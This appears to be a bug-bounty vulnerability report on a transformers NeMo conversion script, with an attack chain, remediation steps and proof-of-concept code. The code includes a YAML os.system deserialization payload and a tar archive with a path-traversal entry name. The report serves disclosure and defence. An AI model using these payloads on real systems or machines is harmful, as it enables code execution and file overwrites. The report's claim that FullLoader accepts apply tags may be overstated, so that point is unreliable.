# RCE in huggingface/transformers — Parakeet convert_nemo_to_hf: YAML Deserialization + Path Traversal

## Vulnerability Type
Deserialization of Untrusted Data / Path Traversal

## CVSS 3.1 Score
**9.0 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector | Network (malicious repo on Hugging Face Hub) |
| Attack Complexity | Low |
| Privileges Required | None (anyone can upload to HF Hub) |
| User Interaction | Required (victim runs convert_nemo_to_hf.py) |
| Scope | Changed (YAML payload escapes to host system) |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

## Description
The `convert_nemo_to_hf.py` conversion script in `src/transformers/models/parakeet/` contains two independent vulnerabilities that together enable remote code execution:

**VULN-1: Path Traversal via `tar.extractall()` (line 72)**
The `extract_nemo_archive()` function extracts `.nemo` archives using `tar.extractall(extract_dir)` without path validation. A crafted archive with relative path entries (`../../../etc/cron.d/exploit`) can write files outside the intended extraction directory.

**VULN-2: YAML Deserialization via `yaml.load(..., FullLoader)` (line 360)**
After extraction, the script loads `model_config.yaml` using `yaml.load(open(...), Loader=yaml.FullLoader)`. PyYAML's `FullLoader` allows instantiation of arbitrary Python objects via `!!python/object/apply:` tags, enabling arbitrary code execution.

**Attack Chain:**
1. Attacker uploads a malicious repository to Hugging Face Hub containing a crafted `.nemo` archive
2. Victim runs: `python -m transformers.models.parakeet.convert_nemo_to_hf --hf_repo_id attacker/malicious --model_type ctc --output_dir ./out`
3. Script automatically downloads the `.nemo` from HF Hub via `cached_file()`
4. Archive is extracted with `tar.extractall()` — path traversal writes files to arbitrary locations
5. `model_config.yaml` is loaded with `yaml.FullLoader` — YAML deserialization executes arbitrary Python
6. **Full RCE as the victim user**

## Affected File(s)
- `src/transformers/models/parakeet/convert_nemo_to_hf.py` — lines 72, 360

## Permalinks
1. https://github.com/huggingface/transformers/blob/main/src/transformers/models/parakeet/convert_nemo_to_hf.py#L72 (tar.extractall without path validation)
2. https://github.com/huggingface/transformers/blob/main/src/transformers/models/parakeet/convert_nemo_to_hf.py#L360 (yaml.load with FullLoader)

## Reproduction Steps

### Step 1: Verify vulnerable code in current source
```bash
curl -s https://raw.githubusercontent.com/huggingface/transformers/main/src/transformers/models/parakeet/convert_nemo_to_hf.py | grep -n 'FullLoader\|extractall'
# Output:
# 72:    tar.extractall(extract_dir)
# 360:    nemo_config = yaml.load(open(model_files["model_config"], "r"), Loader=yaml.FullLoader)
```

### Step 2: Run the PoC demonstration
```bash
python3 poc_transformers_parakeet_yaml_rce.py --demo
```

### Step 3: Reproduce YAML deserialization manually
```python
import yaml
import tempfile
import os

# Create malicious YAML payload
yaml_content = """!!python/object/apply:os.system
- echo 'RCE_CONFIRMED' > /tmp/yaml_rce_marker.txt
"""

with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
    f.write(yaml_content)
    yaml_path = f.name

# This is the EXACT vulnerable pattern from convert_nemo_to_hf.py:360
result = yaml.load(open(yaml_path, 'r'), Loader=yaml.FullLoader)
# Arbitrary Python code has been executed
os.unlink(yaml_path)
```

### Step 4: Reproduce path traversal manually
```python
import tarfile
import tempfile
import os

with tempfile.TemporaryDirectory() as tmpdir:
    # Create malicious archive with path traversal
    archive = os.path.join(tmpdir, "malicious.nemo")
    with tarfile.open(archive, "w:gz") as tar:
        data = b"TRAVERSAL_PAYLOAD"
        info = tarfile.TarInfo(name="../../../tmp/traversal_test.txt")
        info.size = len(data)
        tar.addfile(info, fileobj=__import__('io').BytesIO(data))
    
    # Extract — this is the vulnerable pattern from convert_nemo_to_hf.py:72
    extract_dir = os.path.join(tmpdir, "extracted")
    os.makedirs(extract_dir)
    with tarfile.open(archive, "r:gz") as tar:
        tar.extractall(extract_dir)  # No filter='data', no path validation
```

## PoC Script
See attached: `poc_transformers_parakeet_yaml_rce.py`
- `--demo` — demonstrates both vulnerabilities
- `--verify` — checks current GitHub source for vulnerable patterns
- `--create-nemo FILE` — generates a malicious .nemo archive

## Impact
- **Remote Code Execution** on any user who runs the NeMo→HF conversion script with an untrusted repository
- **File system compromise** via path traversal — can overwrite system files, cron jobs, SSH keys
- **Supply chain attack vector** — malicious repo on HF Hub can target ML researchers and engineers
- **No authentication required** — anyone can upload to Hugging Face Hub

## Real-World Scenario
An attacker creates a Hugging Face repository named `parakeet-ctc-finetuned` containing a malicious `.nemo` archive. When a researcher discovers this repo and runs the official conversion script to convert it to Hugging Face format, their machine is compromised. The YAML payload can:
- Steal HF tokens from `~/.cache/huggingface/token`
- Install backdoors in ML pipelines
- Exfiltrate training data
- Escalate to cloud credentials if running in CI/CD

## Remediation

### Fix VULN-2 (YAML Deserialization)
Replace:
```python
nemo_config = yaml.load(open(model_files["model_config"], "r"), Loader=yaml.FullLoader)
```
With:
```python
import yaml
nemo_config = yaml.safe_load(open(model_files["model_config"], "r"))
```

### Fix VULN-1 (Path Traversal)
Replace:
```python
tar.extractall(extract_dir)
```
With:
```python
# Python 3.12+:
tar.extractall(extract_dir, filter='data')

# Or manual validation for older Python:
for member in tar.getmembers():
    member_path = os.path.realpath(os.path.join(extract_dir, member.name))
    if not member_path.startswith(os.path.realpath(extract_dir)):
        raise ValueError(f"Path traversal detected: {member.name}")
tar.extractall(extract_dir)
```

### Additional Recommendation
Add a security warning in the script's help text and documentation:
```
WARNING: This script downloads and executes code from Hugging Face Hub.
Only use trusted repositories. Malicious models can execute arbitrary code.
```

## References
- **CVE-2024-11392** — Similar vulnerability in MobileViTV2 `convert_mlcvnets_to_pytorch.py` (already patched)
- **CWE-502** — Deserialization of Untrusted Data
- **CWE-22** — Path Traversal
- **PyYAML Documentation** — warns that FullLoader "is not safe for untrusted input"

## Similar Vulnerabilities in transformers
The same `yaml.FullLoader` pattern exists in:
- `src/transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py:57` (R2 — separate report)

## Bounty Justification
This report identifies **two independent vulnerabilities** in a single script with a combined attack chain enabling RCE. The scope includes:
1. Supply chain attack vector via Hugging Face Hub
2. Path traversal allowing arbitrary file writes
3. YAML deserialization enabling arbitrary code execution
4. High-impact target (ML engineers, researchers, CI/CD pipelines)

Similar CVE-2024-11392 (MobileViTV2) was previously accepted — this is a separate, equally critical instance.
